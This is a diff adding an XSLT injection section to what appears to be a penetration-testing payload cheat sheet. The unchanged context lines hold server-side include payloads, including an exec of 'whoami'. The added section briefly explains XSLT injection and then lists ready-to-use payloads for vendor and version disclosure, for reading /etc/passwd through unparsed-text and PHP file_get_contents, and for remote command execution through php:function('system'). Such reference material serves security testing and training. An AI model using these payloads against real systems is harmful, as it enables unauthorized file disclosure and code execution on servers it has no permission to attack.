@@ -250,3 +250,26 @@ echo : <!--#echo var="DOCUMENT_NAME" var="DATE_LOCAL" -->
 exec : <!--#exec cmd="whoami" -->
 include : <!--#include virtual="index.html" -->
 
+___________________________________________________________________________________________
+XSLT Injection
+eXtensible Stylesheet Language Transformation (XSLT) is a language enabling the transformation of XML documents. For instance, it can select specific nodes 
+from an XML document and change the XML structure.
+ XSLT injection occurs whenever user input is inserted into XSL data before output generation by the XSLT processor. This enables an attacker to inject 
+additional XSL elements into the XSL data, which the XSLT processor will execute during output generation.
+PHP
+
+-> Information Disclosure
+Version: <xsl:value-of select="system-property('xsl:version')" />
+<br/>
+Vendor: <xsl:value-of select="system-property('xsl:vendor')" />
+<br/>
+Vendor URL: <xsl:value-of select="system-property('xsl:vendor-url')" />
+<br/>
+Product Name: <xsl:value-of select="system-property('xsl:product-name')" />
+<br/>
+Product Version: <xsl:value-of select="system-property('xsl:product-version')" />
+
+->Local File Inclusion (LFI) => <xsl:value-of select="unparsed-text('/etc/passwd', 'utf-8')" 
+                                <xsl:value-of select="php:function('file_get_contents','/etc/passwd')" />
+->Remote Code Execution (RCE) => <xsl:value-of select="php:function('system','id')" />
+
